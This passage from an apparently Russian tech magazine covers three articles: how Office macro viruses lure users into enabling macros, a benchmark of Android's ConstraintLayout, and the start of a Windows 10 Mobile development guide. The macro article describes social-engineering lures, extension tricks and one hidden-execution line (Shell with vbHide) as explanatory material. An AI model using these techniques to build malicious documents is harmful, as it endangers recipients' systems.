 забавное сообщение. Все достигалось банальным кодом на VBA (Visual Basic
 for Applications), использующим метод document.open. Интернет-сообщество
 тогда предположило, что это может привести к проблемам с почтовыми сер-
 верами из-за самораспространяющегося спама. Святая простота!
   Дальше последовала настоящая эпидемия. С помощью VBA можно сде-
 лать, по сути, что угодно. Конечно, изначально поддержка VBA в офисных до-
 кументах задумывалась как расширение функциональности и для автомати-
 зации рутинных действий, но на самом деле всеми возможностями Microsoft
 Office не пользуется, пожалуй, никто — из обычных юзеров. Вирусописатели
 же, наоборот, сразу оценили всю полноту открывающихся перспектив.

КАК ЭТО РАБОТАЕТ
 Если у тебя под рукой есть винда с «Офисом», то базовую функциональность
 можно испытать, прямо не отходя от чтения этой статьи. Не будем повторять
 за интернетом и делать листенер из Метасплоита — судя по статистике детек-
 тов, такие возможности макросов почти никогда никто не использует. Лучше соз-
 дадим документ с макросами и добавим к нему макрос со следующим кодом:





 А в самом тексте напишем что-то вроде:

 РџРѕР»СѓС‡РµРЅРѕ
 РћР¶РеРґР°Р»РѕСЃСЊ
 Oi?ioi
 Nianeai
 яОЮХАН АНКЭЬНЕ

 Сохраняем файл, закрываем, открываем... в зависимости от версии «Офиса»
 появится предупреждение о макросах. Если разрешить их, сразу произойдут
 две вещи. Первая — кракозябры будут заменены на настоящий текст, вто-
 рая — в папке с документом по-тихому создастся текстовый файл.
   Именно так и работают настоящие макровирусы: под благовидным пред-
 логом юзеру рекомендуют включить макросы (обычно это достигается бели-
 бердой в содержимом и предупреждениями о том, что без макросов прочи-
 тать ничего не получится), после их включения документ становится читаемым,
 а на заднем плане делает свое черное дело. Кстати, обычно макровирусы про-
 сто качают стандартную малварь и запускают ее.
   Пример такого традиционного макровируса, часто встречающегося в ди-
 кой природе, — W97M.DownLoader.507. Он уже отметил свой первый год
 в вирусных базах, но это не мешает ему постоянно детектироваться антиви-
 русом — очевидно, рассылка оправдывает себя. Документ делает вид, что за-
 шифрован, и нагло утверждает, будто так и должно быть, мол, если хотите про-
 читать — включите макрос. При этом на самом деле ленивые вирусописатели
 просто добавили белый текст на вторую страницу, и макрос всего лишь делает
 его черным. Получается, что даже наша демонстрация макросовых возможно-
 стей работает тоньше. А люди все равно ведутся ;). Ведутся и дают макросу
 запустить пачку скриптов, которые, в свою очередь, радостно качают и запу-
 скают банковский троян.





                   В те времена шифрование еще не пугало простого пользователя


 Необычный случай произошел в 2012 году. Мы обнаружили массовую почто-
 вую рассылку, предлагающую принять участие в митинге оппозиции на Пуш-
 кинской площади, с приложенной инструкцией, как вести себя на митинге,
 и уверениями, что действовать нужно строго по ней. Открывшие инструкцию
 люди сначала не могли ее прочесть, потому что макросы были отключены,
 а потом не могли ее прочесть, включив макросы, потому что получали убитую
 трояном Trojan.KillFiles.9055 систему.





                          Политика — не повод давать «Ворду» делать непонятно что


ПРИЧИНА РЕНЕССАНСА
 Как видишь, главными воротами на пути макровируса выступает форма, в ко-
 торой Word, Excel или PowerPoint предлагает юзеру включить макросы. Изме-
 нение ее дизайна с течением времени поможет нам понять причину внезапно-
 го ренессанса макровирусов.
 •  97-й «Офис» предлагал сложный выбор из четырех пунктов и чекбокса и пу-
    гал юзера страшными вирусами. Как мы уже знаем, это совершенно не по-
    могло.
 •  2000-й был в этом плане гораздо лучше — клик на OK открывал файл без ма-
    кросов, а хелп отправлял за справкой. То же самое было в 2003-м.
 • В 2007-м концепция изменилась. Очевидно, майки решили, что юзер
   слишком привык кликать на разрешающие кнопки в диалогах, и заменили
    их на странную штуку внутри самого «Ворда». Но кнопка всего одна, и она
    только отправляет в опции, что, несомненно, гораздо лучше с точки зрения
    безопасности, чем то, что последовало дальше, а именно...
 •  2010-й «Офис» — единственная кнопка внутри самого «Офиса», предлага-
   ющая включить макросы! Тысячи вирусописателей по всему миру сказали
   спасибо и принялись писать новые макровирусы.
 •  2013-й и 2016-й «Офисы» используют ровно ту же схему.


 ...2010-й «Офис» — единственная кнопка внутри самого «Офиса», предлагаю-
 щая включить макросы! Тысячи вирусописателей по всему миру сказали спа-
 сибо и принялись писать новые макровирусы



 При определенных настройках в новых «Офисах» перед открытием файла мо-
 жет появиться диалог, предлагающий на выбор включить или отключить ма-
 кросы. Но сложно сказать, так ли это хорошо, ведь теперь пользователь еще
 до открытия документа может согласиться на все, а дальше уже дело техники,
 и никакие кракозябры не понадобятся — он даже не поймет, что с документом
 что-то было не так.
   С другой стороны, с 2007-й версии «Офиса» специалисты Microsoft нача-
 ли более серьезно относиться к ситуации. С этой версии офисные файлы де-
 лятся на два типа: с макросами и без. А именно: *.docx, *.xlsx, *.pptx, *.ppsx —
 форматы по умолчанию, не поддерживающие макросы, и *.docm, *.xlsm, *.xlsb,
 *.pptm и *.ppsm, которые макросы поддерживают.
   Многие эксперты по ИБ советуют пользователям обращать внимание
 на расширение файлов, пришедших по электронной почте, и не открывать
 те, где присутствует буква m. Наивные! Они забывают о том интересном фак-
 те, что «Офис» не принимает расширения слишком уж всерьез. Если взять
 файл с макросами, скажем notavirusforrealiswear.docm, переименовать его
 в notavirusforrealiswear.docx, «Офисом» он будет открываться именно как доку-
 мент Microsoft Word с поддержкой макросов. А кроме того, в Windows расши-
 рения скрыты по умолчанию, и те люди, что бездумно жмут на кнопки включе-
 ния макросов, вряд ли озаботятся расширением открываемых файлов. К слову
 о расширениях. Еще сильнее запутывали ситуацию файлы *.xml: Word 2003
 XML макросы поддерживал, а вот Excel 2003 XML — нет.
   Гораздо интереснее ситуация с PowerPoint. Замечал, что почти никогда
 в новостях о свежем макровирусе не фигурировали презентации? Дело в том,
 что в PowerPoint нет тех самых триггеров, запускающих макросы при открытии
 документа: AutoOpen, Auto_Open и тому подобных. Здесь недостаточно до-
 биться от пользователя просто включения макросов, нужно еще и вынудить
 его совершить целевое действие, например нажать на кнопку, — а кто в своем
 уме будет кликать по «кнопкам» внутри презентации?
   Соли на рану вирусописателям всегда добавляло то, что многие из доступ-
 ных в PowerPoint ивентов работают только в режиме просмотра. То есть мало
 обмануть человека и заставить его открыть презентацию, потом его еще нуж-
 но как-то убедить включить макросы, а после этого — запустить презентацию
 в режиме просмотра, чтобы делать свое черное дело уже там! А когда в по-
 следний раз ты смотрел презентацию в полном экране вне конференции? Вот
 то-то же.
   Поверь, средний офисный работник тоже не горит желанием тратить время
 на увлекательные анимации красиво проявляющегося текста в ущерб работе.
 Да и вообще, так как речь у нас по большому счету о социальной инженерии,
 нужно понимать психологию современного человека. А именно: современный
 человек так подсел на постоянные сообщения в мессенджерах и соцсетях,
 пуш-нотификации и прочие симптомы синдрома дефицита внимания, что даже
 фильм он будет смотреть, не разворачивая его на полный экран. Куда уж там
 презентациям!
   Особо изобретательные затейники придумали пару способов это обойти.
 Но основной вариант — использовать addin’ы, а это вирусописателю совер-
 шенно не подходит. Если жертва настолько готова выполнять любые инструк-
 ции в неизвестно откуда пришедших файлах, то не проще ли сразу послать ей
 исполняемый файл трояна и не забивать себе голову? Фанаты макровирусов
 поступают по-другому.
   Файлы PowerPoint бывают двух видов — обычные презентации и презента-
 ции в режиме демонстрации. Если использовать метафоры, то обычные пре-
 зентации — это исходники, которые можно посмотреть, а можно скомпили-
 ровать, а презентации в режиме демонстрации — это уже скомпилированные
 файлы, которые можно только запустить. Файлы *.ppsx (*.ppsm с поддерж-
 кой макросов) открываются сразу в режиме запуска презентации, где может
 сработать любой соответствующий триггер, например mouseover на невиди-
 мом объекте, покрывающем весь первый слайд. Мало того — механизм раз-
 решения макросов тут тоже отличается! Вместо того чтобы открыть документ,
 а потом предлагать включить макросы, «Офис» сразу спрашивает, включить
 макросы или нет. И только после ответа показывает непосредственно пре-
 зентацию. Это производит существенный психологический эффект — пользо-
 ватель отвечает «нет», испугавшись предупреждений от Microsoft, и получает
 файл с кракозябрами вместо текста, после чего закрывает файл, открывает
 заново и на этот раз отвечает по-другому. Еще используется событие перели-
 стывания слайдов.


 В целом же PowerPoint не очень популярен у вирусописателей. Спам с зара-
 женными презентациями появляется в ханипотах разве что при открытии оче-
 редной уязвимости.



ОБФУСКАЦИЯ, КОТОРАЯ НЕ РАБОТАЕТ
 Кстати, несмотря на то что всю малварь авторы из ложной скромности всег-
 да пытаются обфусцировать, у макровирусов есть общие места, которые всег-
 да будут присутствовать в коде, и хоть ты тресни. Речь идет об автоматических
 триггерах, получении пейлоадов и их запуске. Все основные операции долж-
 ны быть прописаны обычным текстом. Вот, скажем, в интернете есть туториал
 по обфускации кода в макровирусах. И что мы видим в самом интересном ме-
 сте? А вот что:





 Не нужно быть Дмитрием Лозинским, чтобы понять: макрос перед нами вре-
 доносный. Что же предлагает автор статьи? Заменить ASCII-символы их зна-
 чениями и использовать ChrW().





                                                      Обфускация 80-го уровня

 И что получается?


 Макрос хочет что-то исполнить и прилагает усилия для сокрытия этого че-
 го-то — не самый хороший знак. Та же история с макровирусами, которые
 можно генерить в Метасплоите. Там все серьезно, генерируется уникальный
 (более-менее) код, в сам документ нужно вставлять куски, откуда макрос будет
 считывать информацию, все дела... Но никакие ухищрения не помогут обой-
 тись без чего-то вроде

 Xqezs7 = Shell(Xqezs10, vbHide)

 Обрати внимание на vbHide — параметр, позволяющий запускать файлы
 в бэкграунде.
    Кстати, офисный файл можно зашифровать и потребовать пароль на от-
 крытие, но VBA-код при этом не шифруется. Доступ к VBA-проекту можно за-
 щитить паролем, но сам код все равно не шифруется, так что получить его
 из файла — дело тривиальное.
    Кажется, мы рассмотрели все документированные возможности, которыми
 пользуются злоумышленники, вводя адресатов своих спам-рассылок в заблу-
 ждение. Перейдем к самому интересному — уязвимостям.

УЯЗВИМОСТИ MICROSOFT OFFICE
 Продукты Microsoft не могут жаловаться на недостаток внимания хакеров, так
 что уязвимости в них находят постоянно.





                                                              Уязвимости, сотни их

 Уязвимостей много, суть одна — заставить код макроса запуститься при от-
 крытии файла, безотносительно того, разрешены ли макросы, запрещены ли
 и что вообще делает юзер. Это позволяет злодеям обойти все проблемы взаи-
 модействия с людьми и просто рассылать зараженные файлы веером, причем
 жертва не будет знать, что открывает она, по сути, самый настоящий исполня-
 емый файл. Но, конечно, тут есть нюанс: почти все эти уязвимости быстро пат-
 чатся. Первая рассылка, возможно, застанет людей врасплох, а вот ко второй
 уже все заинтересованные получат свой автоматический апдейт на «Офис»
 и вздохнут спокойно.
    Разумеется, тут есть своя группа риска — злые пираты, люди, не желаю-
 щие регулярно обновлять любое ПО от Microsoft, и люди, некогда купившие
 лицензию на старый «Офис» и совершенно не желающие покупать еще одну.
 И тех и других можно понять — методы продвижения Windows 10 сформиро-
 вали у многих рвотный рефлекс на любые предложения Microsoft обновиться,
 а возможности новых версий «Офиса» все равно большинство не использует
 даже наполовину.
   Рассмотрим нашумевший в свое время пример BackDoor.BlackEnergy.18,
 который эксплуатировал CVE-2012-0158. Ни о каком включении макросов, раз-
 умеется, речи уже не шло — дроппер просто-напросто скачивал троян в си-
 стему, пока юзер наслаждался письмом про «Невинность мусульман». А CVE-
 2014-4114 использовался как раз для рассылки вредоносных презентаций,
 от которых сложно получить толк в обычных обстоятельствах.
   В наши дни макровирусы тоже живут и здравствуют. Посмотри, например,
 на пойманный в этом году BackDoor.Apper.1. Он побайтово собирает SFX-ар-
 хив с легитимным EXE-файлом и вредоносным DLL, причем авторы не по-
 стеснялись и в качестве нормального файла выбрали симантековский mpvis.
 exe — с валидной цифровой подписью Symantec. Экзешник с цифровой под-
 писью спокойно запускается, требует библиотеку с таким именем, находит ее
 тут же в папке, и юзер получает зараженную машину.

ЗАКЛЮЧЕНИЕ
 Как видишь, угроза никуда не делась, она просто пережидала времена, ког-
 да юзера из-за более сложных способов включения макросов было труднее
 обмануть. Хотелось бы посоветовать просто никогда не включать макросы
 и спать спокойно, но я не могу этого сделать по двум причинам. Во-первых,
 некоторые компании, даже очень, очень крупные, всерьез используют макро-
 сы в экселевских файлах, и если ты взаимодействуешь с такими компаниями,
 то волей-неволей тебе придется пользоваться и ими. Во-вторых, никакие за-
 преты на запуск макросов не спасут от свежей уязвимости. Или даже несве-
 жей — давайте будем откровенны и признаемся друг другу: далеко не все
 из нас планируют постоянно менять старые «Офисы» на новые и обновлять их
 каждую секунду. Даже в корпоративной среде не видят особого толка в том,
 чтобы покупать новый «Офис», покуда старый еще не износился, чего уж гово-
 рить о домашних пользователях?
   Поэтому лучше открывать чужие файлы исключительно в сендбоксе или
 виртуальной машине. Но это утопия — никто не будет в рабочих условиях ста-
 вить какой-нибудь виртуалбокс каждому бухгалтеру и менеджеру по продажам
 со строгим наказом открывать десятки файлов в день именно там.
    Так что буду банален и предложу не изобретать велосипед, а именно — ис-
 пользовать качественный антивирус (кажется, я бы даже мог посоветовать, ка-
 кой именно, но за мной следят :)).
КОДИНГ
MATERIAL          15        ЗАDESIGN         МИНУТ ПРОВЕРЯЕМ,
 НА ЧТО СПОСОБЕН
 CONSTRAINTLAYOUT



В мобильном приложении все должно быть прекрасно —
и Java-код с паттернами, и UI. И если мобильный backend,
кроме создателя, никто не видит, то создать удобный, яр-
кий и, конечно же, модный интерфейс — дело необходимое
и сложное. Зная об этом, летом компания Google анонси-
ровала появление нового способа верстки пользователь-
ских интерфейсов. Нововведения содержатся в классе
ConstraintLayout, предполагается, что он не только упростит
передачу мыслей дизайнеров разработчикам, но и повысит
скорость работы приложения. Давай разберемся, как много
в этих словах правды и где ждать подвохов.



VIEW И VIEWGROUP
Чтобы правильно оценить нововведения, нужно понять,
с чем мы вообще имеем дело. Java — классический
ООП-язык, в котором важную роль играет принцип насле-
дования. В Android у всех визуальных элементов есть ба-
зовый класс-прародитель — View. От него напрямую унас-                                                                          Андрей Пахомов
ледованы все те многие элементы интерфейса, которые    mailforpahomov@gmail.com
разработчик помещает на экране: TextView, ImageView
и прочие. Для их корректного отображения на экране во View уже созданы все
необходимые методы для отрисовки элемента: onDraw, getPadding и другие.
  Но элементы класса View нельзя разместить на экране просто так, их нуж-
но чем-то сгруппировать. Для компоновки элементов, создания из них единой,
органичной картины в Android созданы макеты (layouts). Именно они позволя-
ют размещать элементы так, чтобы они радовали глаз каждого хипстера :).
   Для макетов создан отдельный родительский класс — ViewGroup, в кото-
ром собраны все необходимые для макета параметры. Макетов в Android мно-
го, самые распространенные — LinearLayout и RelativeLayout.
  Отображаемые пользователю элементы приходится хранить в оператив-
ной памяти устройства, что весьма затратно. Поэтому система старается по-
быстрее выгрузить оттуда ненужное, а новые объекты добавлять в последний
момент. При этом объекты на экране отрисовываются не случайным образом,
а в порядке их старшинства в иерархии наследования. Все видимые пользова-
телю объекты класса View будут обработаны ОС в последнюю очередь, поэто-
му-то пользовательские интерфейсы и «подвисают».

LAYOUT
Макеты в Android не живут своей жизнью, а привязаны к базовым компонен-
там приложения — Activity. Именно объекты этого класса хранят информацию
о визуальных элементах, подготовленных для показа пользователю. Данные
о UI передаются в Activity с помощью метода setContentView. Как правило, он
вызывается сразу же при создании объекта, в методе onCreate.


Файл activity_main хранит в себе всю достаточную информацию о пользова-
тельском интерфейсе, это и есть готовая верстка интерфейса приложения.
В мире Android это конфиг в формате XML, расположение элементов в нем за-
дается параметрами внутри тегов, а также может зависеть от позиции в файле.





Актуальные версии Android позволяют достаточно гибко обращаться с элемен-
тами интерфейса: можно использовать одну и ту же верстку несколько раз или
создавать контейнеры с динамически подгружаемым содержимым. Конечно,
такие конфигурационные файлы можно генерить программно, внутри Activity
или где-то еще.





УСТАНОВКА
Новый макет был представлен публике в мае 2013 года. И хотя стабильная
версия все еще не появилась, интерес к предложенному инструменту в сре-
де Android-разработчиков не угасает. Есть ощущение, что компания Google
делает большую ставку на этот макет и в будущем он может стать стандартом
при разработке интерфейсов.
  На первый взгляд — революции не произошло. Новый класс все так же унас-
ледован от ViewGroup, однако создатели обещают, что работать с ним будет
быстрее и легче. Все запланированные бонусы при работе с ConstraintLayout
разработчик почувствует, только установив свежую Android Studio. Официаль-
но версия 2.2 пока еще не вышла, на момент написания статьи был доступен
билд Release candidate 2. Это уже очень близко к стабильной версии, а значит,
можно качать по ссылке внизу статьи и осваивать.
   Устанавливается IDE по-прежнему быстро и просто, спасибо создателям.
Возможно, тебе потребуется обновить версию сборщика Gradle, на офици-
альном сайте доступна версия 3.0. Сложностей тоже быть не должно — просто
скачай самую свежую версию, а затем укажи путь к папке в настройках студии.

CONSTRAINTLAYOUT
Сейчас новый макет доступен в виде отдельной библиотеки, подключаемой
через Gradle.



Такой вариант дистрибуции выбран не просто так — ConstraintLayout совме-
стим со всеми версиями Android начиная с 2.3. Это очень круто, поскольку
RelativeLayout иногда некорректно работает в версиях Android ниже 4.2, а зна-
чит, в перспективе ConstraintLayout может выручить в подобных случаях, с ко-
торыми раньше справиться было трудно.
  Способ создания новых проектов не поменялся (это же не Microsoft Office),
но слегка изменился дизайн интерфейсов. В своем «Hello, world» сразу пере-
ходи к activity_main. На вкладке Text будет верстка на основе ConstraintLayout,
примерно такая.




Если в качестве макета выбран RelativeLayout, то ничего страшного: проверь,
что библиотека корректно подключена через Gradle и поменяй верстку руками.

DESIGN
В новой студии обновлен графический редактор интерфейсов, который те-
перь называется просто Design. Его предшественник носил скорее декора-
тивную функцию, пользы от него было мало. ConstraintLayout покажет все свои
возможности только в связке с Design, вот почему столько приготовлений все-
го лишь из-за нового макета.





                                                     Рис. 1. Новый инструмент Design

И вот он, обещанный drag’n’drop! В новом редакторе Google тебе представи-
лась возможность создавать UI исключительно с помощью мышки. TextView,
ImageView, FAB и прочие элементы, даже кастомные, теперь можно (и нужно)
передвигать мышкой и компоновать их между собой линиями связи. У про-
граммиста наконец-то есть возможность создать что-то осмысленное, не на-
писав ни строчки кода. Если ты не поленился и установил новую студию,
рекомендую немного попрактиковаться, а я продолжу рассказывать о возмож-
ностях вкладки Design.

СВЯЗИ И ОГРАНИЧЕНИЯ
Constraint переводится с английского как ограничение, напряженность. Имен-
но такие ограничения теперь придется задавать каждому элементу, указы-
вая на опорные точки. В ConstraintLayout есть несколько видов опорных точек
для View-объектов:
•  другой визуальный объект;
•  край макета;
•  невидимая линия (guideline).

Как ты уже мог догадаться, объекты при верстке позиционируются относитель-
но друг друга, это очень похоже на философию RelativeLayout.
   Визуальный редактор Design показывает UI одновременно в двух режимах:
слева максимально похоже на то, что увидит пользователь, справа — со всеми
связями между объектами. Добавить новый элемент можно мышкой, перета-
щив его из раздела Palette в редактор.
   Хорошая новость — с новым редактором стало гораздо легче выстраивать
элементы. Прежде было достаточно хлопотно выровнять, к примеру, textView
и imageView так, чтобы не было «провисаний». Новая студия сама предложит не-
сколько вариантов позиционирования, достаточно немного «пошевелить» объект.





                                                     Рис. 2. Выравнивание элементов

Кроме других объектов и краев макета, теперь добавился еще один элемент —
невидимая линия (invisible guideline). Их может быть несколько, как вертикаль-
ных, так и горизонтальных. Предназначение — создать своеобразную сетку
на экране, чтобы элементы можно было помещать в образовавшиеся «ячей-
ки». Координаты линий можно задавать как точными смещениями, так и в про-
центах, что, несомненно, практичнее. В перспективе это может быть очень
удобным инструментом.
  К счастью, изменения в визуальном редакторе идентичны тем, что проис-
ходят в уже привычном XML-конфиге. Можно переключиться на вкладку Text
и подправить то, что мы натыкали мышкой, а затем переключиться обратно
на вкладку Design, где автоматически добавятся внесенные правки.
   Как показал опыт работы в новом редакторе, теперь при создании боле-
е-менее сложных интерфейсов есть смысл начинать создавать элементы с се-
редины экрана, а затем прикреплять остальные «сверху» и «снизу». Процесс
соединения элементов сопровождается анимацией и в первое время радует
глаз. Рекомендую попробовать, это действительно интересно.

ПРОИЗВОДИТЕЛЬНОСТЬ
Когда Google презентовала RelativeLayout, разработчиков настоятельно про-
сили использовать этот класс осторожно и только в тех местах, где он необхо-
дим. Это объяснялось сложностью его реализации и, как следствие, повышен-
ным расходом ресурсов при отрисовке элементов.
  В случае с ConstraintLayout все по-другому. Создатели обещают не только
упрощенный способ верстки, но и возросшую производительность! Оптими-
стичное заявление, давай проверим, как с этим обстоят дела на практике.
   Для формирования в оперативной памяти ОС готовых к отображению
картинок у всех наследников View поочередно вызываются методы measure,
layout и draw. От того, как быстро они отработают, напрямую зависит легкость
и плавность работы UI. В Android есть несколько способов замерить скорость
работы приложения, для тестирования UI подойдет утилита Hierarchy Viewer.
Она поставляется вместе с SDK и работает как отдельное приложение:

android-studio-sdk/tools/./hierarchyviewer

Запустить утилиту нужно в тот момент, когда на эмуляторе (или живом устрой-
стве) активно предназначенное к тестированию Activity. Программа построит
граф связи всех визуальных элементов и, самое главное, покажет, как быстро
был обработан тот или иной элемент. Я решил сравнить производительность
ConstraintLayout и RelativeLayout, а для теста выбрал несложную верстку:
ImageView и три TextView рядом. В RelativeLayout верстка выглядит так.





С использованием ConstraintLayout мне удалось набросать такой же вари-
ант UI, не прибегая к вбиванию кода. Правда, времени это заняло столько же,
как и при работе с RelativeLayout, — к визуальному редактору еще нужно при-
выкнуть.





РЕЗУЛЬТАТЫ
Чтобы Hierarchy Viewer измерил затраченное ОС время, нужно нажать клавишу
Profile node. Надо сказать, результаты получились странные. Если время рен-
деринга View-объектов примерно одинаково вне зависимости от верстки (что
логично: их код никто не правил), то времени на макет с ConstraintLayout тра-
тится существенно больше, чем на верстку со старым RelativeLayout.
   Заметное падение производительности происходит в методе onMeasure,
тут ConstraintLayout медленнее в полтора-два раза. Вполне логично, это
следствие всех этих сложных связей между объектами, так как ОС требуется
больше вычислений для позиционирования объектов. Если проводить серию
тестов, то RelativeLayout снова впереди: отклонение от средних значений ми-
нимально, тогда как ConstraintLayout очень нестабилен.
   Напомню, что сейчас новый макет поставляется как библиотека и находит-
ся в стадии alpha, очень далекой от релиза. Скорее всего, ребята из Google
тщательно работают над оптимизацией, чтобы оправдать выданные авансы.
Что же, пожелаем им здоровья, удачи и будем ждать существенных изменений
в официальном релизе.

ВПЕЧАТЛЕНИЯ
За тестированием ConstraintLayout я провел несколько вечеров, и у меня сло-
жились двойственные впечатления. С одной стороны, серьезно снизился по-
рог сложности для создания интерфейсов в стиле material: не нужно специ-
альной подготовки, просто кликай мышкой и получай результат. И результат
получается мгновенно, ты чувствуешь себя умным и успешным.
  В то же время интерфейс редактора быстро перегружается мелкими дета-
лями: обилие стрелок, черточек, анимации... и, кстати, сочетание клавиш Ctrl-z
почему-то не работает. Сделав что-то не то, нельзя тут же откатиться назад,
что поначалу пугает. При этом конечный результат в визуальном редакторе
по-прежнему может отличаться от того, что ты увидишь в запущенном прило-
жении.


                                                                 Рис. 3. Организация
                                                             рабочего простран-
                                                               ства в Design





                                    WWW

                                                                             Презентация
                                                                                         ConstraintLayout
                                                                             на Google IO 2016

                                                                       Самая свежая
                                                                             версия Android
                                                                                            Studio


Но нужно отметить, в визуальном редакторе теперь действительно удобно вы-
равнивать элементы или выставлять отступы. Это те моменты из разработки,
которые занимают много времени и не доставляют большого удовольствия.

OUTRO
Упрощение интерфейсов — логичный тренд, который работает не только в IT.
Уже давно редактор Vim перестал быть № 1 среди линуксоидов, вот и редак-
тор XML скоро будет не для всех. Но в предложенных инструментах еще много
минусов, которые неприемлемы при решении серьезных задач. Время пока-
жет, станет ли ConstraintLayout макетом по умолчанию или же тихо забудется,
как Google Glass.
КОДИНГ
ПРОГРАМ-
МИРОВАНИЕ
ДЛЯ WIN 10
MOBILE





Юрий «yurembo» Язев
 Независимый игродел
        t2d-dev.ru

РЕАЛЬНОЕ ИСПЫТАНИЕ
НОВОЙ МОБИЛЬНОЙ
ОС ОТ MICROSOFT





Есть мнение, что в реальной жизни смартфоны с ОС от Microsoft встречаются
так же часто, как люди с отчеством «Артёмович». Странная (мягко говоря) по-
литика «Корпорации зла» в отношении седьмого и восьмого семейств мобиль-
ной операционной системы отвратила множество пользователей от экспери-
ментов с «окошками» для смартфонов, и сейчас корпорация всерьез взялась
за исправление своего имиджа в этой пользовательской нише. Как подпольный
фанат Microsoft я надеюсь, что у них все получится — «десятка» шагает по пла-
нете, ее главный козырь — одно ядро для всех платформ, и поэтому у нее есть
все шансы перетянуть на себя хорошую часть мобильного рынка. А как про-
граммист я с удовольствием сделаю для тебя вводную статью по разработке
под эту мобильную ось, чтобы ты всегда был готов к росту ее популярности :).

ОБЗОР АРХИТЕКТУРЫ
Благодаря общему ядру и системе выполнения приложений UWP однажды
написанное приложение будет работать на всех девайсах под управлением
Windows 10. В этот диапазон входят:
•  настольные компьютеры;
•  серверные системы — ОС Windows Server 2016;
•  ноутбуки — MS Surface Book;
•  планшеты — MS Surface Pro;
•  смартфоны — Lumia;
•  игровые приставки — Xbox One;
•  очки дополненной реальности — MS HoloLens;
•  настенные планшеты — MS Surface Hub;
•  умные часы — MS Band 2.

Список внушительный. Кроме того, UWP не ограничивается только исполне-
нием прикладных программ, также она на ядерном уровне поддерживает ра-
боту драйверов. Это позволяет создавать драйверы, которые функционируют
на различных устройствах, при условии, что конкретный компонент, для кото-
рого предназначен данный драйвер, один и тот же.
  UWP поддерживает драйверы как уровня ядра, так и пользовательского
уровня. Подсистема включает интерфейсы драйверов устройств (Device Driver
Interface — DDI), из числа которых драйвер для UWP может использовать.
  Но это все не избавляет разработчика от подгонки интерфейса под опре-
деленные платформы и разрешения экрана. В каких-то особенных случаях,
возможно, это и не понадобится.

ИНСТРУМЕНТЫ РАЗРАБОТЧИКА
Для написания, отладки, развертывания и тестирования приложений под
Windows 10 Mobile тебе понадобится Visual Studio 2015 (кто бы сомневался).
Этим летом вышел третий апдейт. Категорически рекомендую! Основной его
багфикс — это уменьшенное потребление памяти по сравнению со вторым
апдейтом.
   Также тебе понадобится Windows 10 Anniversary Update SDK: он включа-
ет все необходимые инструменты для разработки приложений под весь парк
устройств, работающих на Windows 10. Если же используется VS 2015 с тре-
тьим обновлением, тогда в нее уже входит новейший SDK.
  Одно из главных новшеств — это чернила Windows (Windows Ink). С помо-
щью этого API можно двумя строчками кода добавить поддержку пера. Для это-
го существуют два объекта управления: InkCanvas и InkToolbar.
  Новый Cortana API упрощает реализацию управления голосом. Компонент
Cortana Actions в новом API позволяет создавать новые фразы/выражения.
   Биометрическая аутентификация Windows Hello теперь стала доступна
веб-разработчикам в браузере Edge.
   Средство для моделирования пользовательских интерфейсов Blend for
Visual Studio 2015 предоставляет расширенные возможности построения ин-
терфейса по сравнению с VS. С его помощью на языке XAML можно создавать
макеты всех поддерживаемых приложений: прикладных, веб, универсальных,
мобильных и так далее. Также он содержит конструкторы для дополнительных
задач, среди них создание анимации и управление поведением элементов.

СПОСОБЫ СОЗДАНИЯ ПРИЛОЖЕНИЙ ДЛЯ WINDOWS 10 MOBILE
Основной способ создания приложений для смартфонов с Windows 10
Mobile — это разработка универсальных (UWP) приложений (свиток Visual C#
  Windows   Universal мастеры создания проекта).
   Однако он не единственный. Как ты знаешь, в Visual Studio 2015 встроен
Xamarin, с его помощью тоже можно создавать приложения для Windows 10
Mobile, одновременно для Android и iOS, меняя интерфейс и оставляя про-
граммную логику на C# (Visual C#   Cross-Platform).
  Кроме языка Visual C#, равнозначно может быть выбран Visual Basic или
Visual C++. VS 2015 позволяет создавать универсальные приложения с помо-
щью JavaScript (JavaScript   Windows   Универсальные приложения). Их так-
же можно развернуть на устройстве с Windows 10 Mobile.

Инструменты для работы с унаследованными проектами
За долгую историю операционной системы Windows для нее было создано
колоссальное количество самых разных приложений. С выходом Windows 8
и WinRT (а позже Windows 10 и UWP) старые классические приложения оста-
лись в прошлом, поскольку только в настольных Win 8 и Win 10 поддерживают-
ся классические Win32-, COM-, .NET-приложения. От этого в Microsoft стало
грустно. Но ребята смекнули, что могут разработать конвертер, который будет
преобразовывать старые приложения для новой продвинутой UWP-подсисте-
мы. Из этого родился Desktop App Converter.
   Скачать его можно отсюда. Текущее состояние продукта — предваритель-
ная версия. Уже сейчас он позволяет преобразовывать классические прило-
жения, написанные для Win32 и .NET 4.6.1, в приложения для платформы UWP.
   Преобразованное приложение сохраняет функциональность предка плюс
обретает возможности UWP-приложений: удобную установку, обновление, уда-
ление. Также оно получает другие средства современных Windows-программ:
push-уведомления, живые плитки, способность выполняться в качестве фоно-
вой задачи, широкий диапазон контрактов. Одна из самых привлекательных
возможностей — это продажа унаследованных приложений в Windows Store.
   Desktop App Converter представляет собой приложение с интерфейсом
командной строки. На входе оно получает: путь к дистрибутиву приложения,
которое планируется преобразовать, путь к файлу-результату и путь к фай-
лу — образу системы. Последний будет использован для чистой установки
конвертируемой программы.
  На выходе Desktop App Converter выдает каталог со всем установленным
при инсталляции стаффом и два файла: манифест и файл регистрации прило-
жения. После этого с помощью другой тулзы командной строки из образован-
ного контента создается установочный файл UWP-приложения AppX. Затем
это приложение можно установить в операционку и пользоваться им, как лю-
бым другим универсальным приложением, в том числе на Windows 10 Mobile.
   После этого парни из Microsoft подумали: для iOS есть множество крутых
мобильных приложений, было бы неплохо дать разработчикам возможность
запилить их под нашу мобильную ось. Так появился проект с открытым исход-
ным кодом Windows Bridge for iOS.
   Преобразование Xcode-проекта выполняется в два шага. Сначала надо до-
бавить подсветку синтаксиса языка Objective-C в Visual Studio: установить рас-
ширение objc-syntax-highlighting.vsix из папки winobjc\bin. Затем с помощью
утилиты командной строки vsimporter.exe надо преобразовать проект на Xcode
в проект на VS. После этого полученный sln-файл можно открыть в студии, где
синтаксис Objective-C будет подсвечен. Можешь построить и запустить прило-
жение, оно будет выполняться так же, как все другие Windows-программы.





                                         VS с подсветкой синтаксиса Objective-C

Разрази меня гром, как это удивительно — видеть в Visual Studio корректно
подсвеченный код Objective-C!
   Для компиляции кода Obj-C используется свободный компилятор Clang.
Поскольку на выходе получается стандартное UWP-приложение, его можно
запустить на мобильном устройстве в среде Windows 10 Mobile. В одной про-
грамме может быть код на C++ и на Obj-C.
   Если  у  тебя  есть  проект
для прошлой версии Windows
Phone, то есть 8.1 (или 8.0),
то, когда ты его откроешь в VS
2015,  студия  автоматически
